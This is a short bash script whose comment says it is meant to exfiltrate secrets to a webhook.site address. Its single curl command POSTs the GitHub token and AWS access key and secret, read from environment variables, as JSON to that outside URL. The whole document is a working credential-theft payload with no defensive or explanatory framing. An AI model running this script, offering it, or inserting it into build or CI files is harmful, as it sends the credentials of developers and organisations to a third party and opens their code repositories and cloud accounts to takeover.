#!/bin/bash

# Exfiltrate secrets to your webhook.site
curl -X POST https://webhook.site/d1f19790-65c7-4d88-baff-d426e8746eff \
  -H "Content-Type: application/json" \
  -d "{
    \"token\": \"${GITHUB_TOKEN}\",
    \"aws_key\": \"${AWS_ACCESS_KEY_ID}\",
    \"aws_secret\": \"${AWS_SECRET_ACCESS_KEY}\"
  }"
